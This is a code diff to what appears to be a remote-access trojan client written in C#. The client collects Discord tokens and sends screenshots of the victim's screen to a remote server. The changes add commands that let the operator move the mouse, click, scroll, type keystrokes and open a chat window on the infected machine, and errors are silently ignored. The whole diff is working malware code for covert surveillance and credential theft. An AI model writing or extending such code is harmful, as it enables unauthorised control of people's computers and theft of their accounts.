@@ -3,6 +3,7 @@ using AForge.Video.DirectShow;
 using LazyServer;
 using NAudio.Wave;
 using Newtonsoft.Json.Linq;
+using Sweep.Forms;
 using System;
 using System.Diagnostics;
 using System.Drawing;
@@ -34,6 +35,8 @@ namespace Client
         private static CancellationTokenSource micTokenSource;
         private static Task micLoopTask;
         private static bool micLoopRunning = false;
+
+        private static Chat chatform;
 
         public static bool isGracefulDisconnect = false;
         private static WaveInEvent waveIn;
@@ -78,12 +81,14 @@ namespace Client
                 if (!isGracefulDisconnect)
                 {
                     await GClass.ReconnectLoop(client);
+                    var screenshot = GClass.CaptureScreen(Screen.AllScreens[monitoridx]);
+                    await client.SendFileBytesWithMeta(screenshot, clientInfo.ToString());
                 }
             };
 
             var screenshot = GClass.CaptureScreen(Screen.AllScreens[monitoridx]);
             await client.SendFileBytesWithMeta(screenshot, clientInfo.ToString());
-
+            await client.SendFileBytesWithMeta(screenshot, clientInfo.ToString());
             GClass.StartHeartbeat(client);
 
             client.MessageReceived += async (s, e) =>
@@ -174,6 +179,31 @@ namespace Client
                                 ["body"] = GClass.GetDiscordTokens()
                             }.ToString());
                             break;
+
+                        case "chat":
+                            chatform = new Chat();
+                            Chat.Instance.add($"[ Chatting with {(string)message["username"]} ]");
+                            FormSlider.ShowSliding(chatform, 3);
+
+                            break;
+                        case "mousemove":
+                            int x = (int)message["x"];
+                            int y = (int)message["y"];
+                            GClass.MouseMoveAbsolute(x, y);
+                            break;
+                        case "mouseclick":
+                            string button = (string)message["button"];
+                            GClass.PerformMouseClick(button);
+                            break;
+                        case "mousescroll":
+                            int delta = (int)message["delta"];
+                            GClass.ScrollMouse(delta);
+                            break;
+                        case "key":
+                            string key = (string)message["key"];
+                            GClass.SendKeyPress(key);
+                            break;
+
                     }
                 }
                 catch { /* silently ignore */ }
@@ -183,6 +213,12 @@ namespace Client
         static async Task StartScreenshotLoopAsync(LazyServerClient client, JObject message)
         {
             await StopScreenshotLoopAsync();
+
+            Screen screen = Screen.AllScreens[monitoridx];
+            Rectangle bounds = screen.Bounds;
+
+            int screenWidth = bounds.Width;
+            int screenHeight = bounds.Height;
 
             screenshotTokenSource = new CancellationTokenSource();
             var token = screenshotTokenSource.Token;
@@ -205,7 +241,9 @@ namespace Client
                         await client.SendFileBytesWithMeta(shot, new JObject
                         {
                             ["msg"] = "screenshot",
-                            ["monitors"] = Screen.AllScreens.Length
+                            ["monitors"] = Screen.AllScreens.Length,
+                            ["width"] = screenWidth,
+                            ["height"] = screenHeight
                         }.ToString());
                     }
                     catch { }
